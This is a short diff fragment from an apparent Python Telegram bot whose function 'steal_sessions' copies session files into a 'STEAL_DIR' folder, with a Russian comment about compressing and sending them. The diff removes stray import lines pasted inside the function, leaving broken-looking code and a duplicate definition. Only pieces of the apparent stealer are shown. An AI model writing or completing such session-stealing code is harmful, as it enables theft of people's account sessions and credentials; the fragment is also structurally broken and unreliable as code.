@@ -69,11 +69,6 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     shutil.copy(p, STEAL_DIR)
         
         # Сжатие и отправка        
-        import io
-import zipfile
-from pathlib import Path
-from telegram import InputFile
-
 async def steal_sessions(update, context):
     try:
         paths = [
